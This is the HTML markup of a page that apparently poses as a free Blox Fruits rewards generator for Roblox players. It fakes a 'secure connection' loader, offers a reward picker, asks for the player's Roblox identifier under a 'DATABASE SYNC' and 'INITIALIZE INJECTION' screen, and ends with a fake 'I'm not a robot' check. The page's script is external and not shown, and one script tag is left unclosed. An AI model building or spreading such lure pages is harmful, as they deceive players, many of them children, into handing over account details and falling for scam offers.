<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blox Fruits - Fire Edition 2026</title>
    
    <script type="text/javascript">

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
</head>
<body>

    <div class="fire-background"></div>
    <div class="overlay-gradient"></div>

    <div id="intro-loader" class="screen-fullscreen">
        <div class="loader-content">
            <img src="images/logo.png" class="pulsing-logo">
            <div class="load-track"><div class="load-bar"></div></div>
            <p class="neon-status">ESTABLISHING SECURE CONNECTION...</p>
        </div>
    </div>

    <div id="selection-stage" class="main-container" style="display: none;">
        <header>
            <img src="images/logo.png" class="header-logo">
            <h2 class="fire-title">SELECT 3 UNIQUE REWARDS</h2>
        </header>
        <div class="selected-slots">
            <div class="slot" id="slot-0"></div>
            <div class="slot" id="slot-1"></div>
            <div class="slot" id="slot-2"></div>
        </div>
        <div class="rewards-grid" id="grid"></div>
    </div>

    <div id="sync-stage" class="screen-fullscreen" style="display: none;">
        <div class="luxury-terminal">
            <h3 class="neon-text">DATABASE SYNC</h3>
            <div class="cyber-input-box">
                <input type="text" id="rbx-user" placeholder="ENTER ROBLOX IDENTIFIER..." autocomplete="off">
                <div class="input-line"></div>
            </div>
            <p id="error-box" class="error-msg"></p>
            <button id="sync-btn" class="glow-btn">INITIALIZE INJECTION</button>
        </div>
    </div>

    <div id="final-stage" class="screen-fullscreen" style="display: none;">
        <div class="luxury-terminal final-check-box">
            <h2 class="neon-text" style="color: #44ff44;">FINAL CHECK</h2>
            <p>Are you ready to Unlock your rewards?</p>
            <button id="captcha-btn" class="robot-btn">
                <span class="check-icon">✓</span> I'm not a robot
            </button>
        </div>
    </div>

    <audio id="snd-tap" src="media/tap.mp3"></audio>
    <audio id="snd-select" src="media/selection.mp3"></audio>
    <audio id="snd-error" src="media/error.mp3"></audio>

    <script src="script.js"></script>
</body>
</html>
